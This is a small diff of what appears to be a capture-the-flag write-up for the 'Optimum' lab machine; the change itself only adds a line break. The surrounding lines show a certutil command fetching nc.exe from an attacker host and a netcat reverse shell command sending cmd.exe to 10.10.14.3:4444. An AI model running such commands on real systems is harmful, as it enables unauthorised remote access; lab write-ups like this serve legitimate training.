@@ -53,6 +53,6 @@ I used certutil to transfer the file from my Kali to the Windows machine:
 ```bash
 certutil -urlcache -split -f "http://10.10.14.3/nc.exe" nc.exe
 ```
-Finally, I ran the netcat with: ```nc.exe 10.10.14.3 4444 -e cmd.exe``` </br>
+Finally, I ran the netcat with: ```nc.exe 10.10.14.3 4444 -e cmd.exe``` </br> </br>
 <img src="images/optimum/netcat_shell.png" alt="netcat_shell" width="800" height="200"/> </br> </br>
 
